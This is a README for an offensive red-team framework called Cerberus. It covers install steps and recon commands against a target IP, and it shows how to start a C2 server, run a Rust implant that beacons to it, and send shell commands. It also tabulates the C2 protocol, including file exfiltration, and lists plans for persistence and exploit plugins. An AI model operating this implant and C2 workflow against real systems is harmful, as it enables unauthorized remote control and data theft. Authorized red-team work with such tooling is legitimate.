# Cerberus install and configs

**Elite Red Team Framework** — Clean. Fast. Autonomous. Stealth-by-default.

Cerberus is a modern red-team framework built from the ground up with strict architecture, evidence-first design, and first-class autonomy.

> "Cerberus is not a sloth. It is the deliberate refusal to waste energy on work that a machine can do better."

## Design Principles

1. **Evidence over assumption** — Never re-scan what already exists in the evidence store.
2. **Abstraction over mechanics** — Operators use high-level commands; the framework chooses optimal flags.
3. **Phase discipline** — Kill-chain phases are enforced. Out-of-order actions are blocked by default.
4. **Stealth by default** — Noisy behaviour requires explicit opt-in.
5. **Provenance everywhere** — Every piece of evidence carries source, timestamp, and confidence.
6. **Plugins are first-class** — Strict contracts, schemas, and tests.
7. **Autonomy is interruptible and auditable**.

## Architecture (v0.1)

```
cerberus/
├── core/
│   ├── config.py       # Single source of truth
│   ├── evidence.py     # Provenance + world model
│   ├── phase.py        # Kill-chain state machine
│   ├── plugin_api.py   # Strict plugin contracts
│   └── c2.py           # Async TCP C2 server
├── plugins/
│   ├── recon/          # ping, nmap_basic
│   ├── c2/             # c2_start, c2_beacons, c2_shell, c2_results, c2_stop
│   └── ai/             # auto_loop
├── implants/rust/      # Minimal Rust implant (pre-built + source)
├── cli/                # Typer + Rich operator CLI
├── mcp/                # MCP skeleton
└── sessions/           # Evidence + loot
```

## Quick Start

```bash
cd cerberus
pip install pydantic rich typer httpx aiofiles orjson

# Configure
PYTHONPATH=. python -m cerberus.cli.main wizard
PYTHONPATH=. python -m cerberus.cli.main set rhost 10.10.11.5

# Recon
PYTHONPATH=. python -m cerberus.cli.main run ping
PYTHONPATH=. python -m cerberus.cli.main run nmap_basic
PYTHONPATH=. python -m cerberus.cli.main sitrep

# C2 + implant
PYTHONPATH=. python -m cerberus.cli.main run c2_start
# (other terminal)
chmod +x cerberus-implant   # or implants/rust/cerberus-implant
CERBERUS_C2=127.0.0.1:8443 ./cerberus-implant

PYTHONPATH=. python -m cerberus.cli.main run c2_beacons
PYTHONPATH=. python -m cerberus.cli.main run c2_shell --beacon <id> --cmd "id"
PYTHONPATH=. python -m cerberus.cli.main run c2_results --beacon <id>
```

## C2 Protocol (v0.1)

Length-prefixed JSON over TCP (4-byte big-endian length + body).

| Direction | type | purpose |
|-----------|------|---------|
| Implant → C2 | `checkin` | Register + metadata |
| C2 → Implant | `shell` | Run command |
| C2 → Implant | `download` | Exfil local file |
| C2 → Implant | `sleep` | Change interval |
| C2 → Implant | `exit` | Kill implant |
| Implant → C2 | `result` | Command output |
| Implant → C2 | `upload` | File bytes (base64) |

Env vars for implant: `CERBERUS_C2` (host:port), `CERBERUS_SLEEP` (seconds).

## Status

**v0.1 — foundation + C2**

- [x] Project structure
- [x] Core config + evidence store + phase machine
- [x] Plugin API + recon plugins (`ping`, `nmap_basic`)
- [x] Clean CLI (Typer + Rich)
- [x] C2 server + plugins (`c2_start`, `c2_beacons`, `c2_shell`, `c2_results`, `c2_stop`)
- [x] Rust implant (check-in, shell, download/upload, sleep, exit)
- [x] Basic autonomous loop
- [ ] MCP server (full) + local Ollama
- [ ] AES-GCM channel
- [ ] More enum / exploit plugins
- [ ] Persistence & OPSEC hardening

## License

GPL-3.0
